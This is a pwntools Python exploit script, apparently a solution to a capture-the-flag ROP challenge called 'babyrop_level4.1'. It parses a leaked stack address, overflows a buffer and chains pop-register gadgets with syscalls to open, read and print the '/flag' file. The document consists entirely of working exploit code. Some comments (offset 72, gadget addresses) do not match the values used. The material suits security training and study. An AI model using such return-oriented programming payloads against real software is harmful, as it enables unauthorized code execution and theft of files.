from pwn import *
#offset rip - input = 72

#Gadgets
#0x00000000004026db : pop rax ; ret
#0x00000000004026bb : pop rdi ; ret
#0x00000000004026eb : syscall

poprax = p64(0x401d56)
poprdi = p64(0x401d4e)
poprsi = p64(0x401d46)
poprdx = p64(0x401d3f)
syscall = p64(0x4026eb)
openrax = p64(0x2)
readrax = p64(0x0)
writerax = p64(0x1)
rsi = p64(0x0)
rdx = p64(0x0)
offset=40

#p = process('/challenge/./babyrop_level4.1')
p=gdb.debug('/challenge/./babyrop_level4.1',gdbscript='b challenge')
p.recvuntil('located at: ')
leak=p.recvuntil('.\n')
print(leak)

leak = int(leak.strip(b'.\n'),16)

payload = b'/flag\x00'

leak= p64(leak)

payload+=b'A'*(offset-len(payload))
payload+=poprax
payload+=openrax
payload+=poprdi
payload+=leak
payload+=poprsi
payload+=p64(0x0)
payload+=poprdx
payload+=p64(0x0)
payload+=syscall
payload+=poprax
payload+=readrax
payload+=poprdi
payload+=p64(0x3)
payload+=poprsi
payload+=leak
payload+=poprdx
payload+=p64(100)
payload+=syscall
payload+=poprax
payload+=writerax
payload+=poprdi
payload+=p64(0x1)
payload+=poprsi
payload+=leak
payload+=poprdx
payload+=p64(100)
payload+=syscall


p.sendline(payload)